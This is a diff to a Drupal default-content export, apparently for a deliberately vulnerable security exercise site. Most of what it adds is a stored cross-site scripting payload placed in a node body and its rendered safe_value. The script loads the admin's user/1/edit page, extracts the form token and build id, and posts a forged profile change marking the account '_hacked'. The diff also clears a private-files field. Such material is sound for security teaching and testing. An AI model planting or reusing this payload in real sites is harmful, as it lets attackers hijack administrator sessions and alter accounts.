@@ -30,34 +30,85 @@ function fixme_sec_feature_uuid_features_default_content() {
     'und' => array(
       0 => array(
         'value' => 'Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. 
-Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur?',
+Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur?
+
+<script>
+// Test for  the presence of jquery.
+if (typeof jQuery == \'function\') {
+// Fetch a correct token from user/1/edit because we will need it to
+// successfully submit the user edit form later.
+// TODO: Include a check to increase the chance that the current user is admin,
+// which will reduce the number of access denied error messages in the log.
+jQuery.get(Drupal.settings.basePath + \'user/1/edit\',
+  function (data, status) {
+    if (status == \'success\') {
+      var t = new Date().getTime();
+      // Extract the token and other required data
+      var name = \'admin\';
+      var fullname = t +\'_hacked\';
+      var matches = data.match(/name="form_token" value="([a-zA-Z0-9_-]*)"/);
+      var token = matches[1];
+      var matches = data.match(/name="form_build_id" value="(form-[a-zA-Z0-9_-]*)"/);   
+      var build_id = matches[1];
+      // Post the minimum amount of fields. Other fields get their default values.
+      var payload = {
+        "name": name,
+        "form_id": \'user_profile_form\',
+        "field_full_name[und][0][value]": fullname,
+        "form_token": token,
+        build_id : build_id
+      };
+      jQuery.post(Drupal.settings.basePath +  \'user/1/edit\', payload);
+      }
+    }
+  );
+}
+</script>',
         'summary' => '',
         'format' => 'filtered_html',
         'safe_value' => '<p>Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt.<br />
 Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur?</p>
-',
+<script>
+<!--//--><![CDATA[// ><!--
+
+// Test for  the presence of jquery.
+if (typeof jQuery == \'function\') {
+// Fetch a correct token from user/1/edit because we will need it to
+// successfully submit the user edit form later.
+// TODO: Include a check to increase the chance that the current user is admin,
+// which will reduce the number of access denied error messages in the log.
+jQuery.get(Drupal.settings.basePath + \'user/1/edit\',
+  function (data, status) {
+    if (status == \'success\') {
+      var t = new Date().getTime();
+      // Extract the token and other required data
+      var name = \'admin\';
+      var fullname = t +\'_hacked\';
+      var matches = data.match(/name="form_token" value="([a-zA-Z0-9_-]*)"/);
+      var token = matches[1];
+      var matches = data.match(/name="form_build_id" value="(form-[a-zA-Z0-9_-]*)"/);   
+      var build_id = matches[1];
+      // Post the minimum amount of fields. Other fields get their default values.
+      var payload = {
+        "name": name,
+        "form_id": \'user_profile_form\',
+        "field_full_name[und][0][value]": fullname,
+        "form_token": token,
+        build_id : build_id
+      };
+      jQuery.post(Drupal.settings.basePath +  \'user/1/edit\', payload);
+      }
+    }
+  );
+}
+
+//--><!]]>
+</script>',
         'safe_summary' => '',
       ),
     ),
   ),
-  'field_private_files' => array(
-    'und' => array(
-      0 => array(
-        'fid' => 21,
-        'display' => 1,
-        'description' => '',
-        'uid' => 1,
-        'filename' => 'very_private.pdf',
-        'uri' => 'private://very_private.pdf',
-        'filemime' => 'application/pdf',
-        'filesize' => 8732,
-        'status' => 1,
-        'timestamp' => 1379928453,
-        'uuid' => '88d451e5-68e3-4f7c-9f80-6d105bb7c27a',
-        'rdf_mapping' => array(),
-      ),
-    ),
-  ),
+  'field_private_files' => array(),
   'rdf_mapping' => array(
     'rdftype' => array(
       0 => 'sioc:Item',
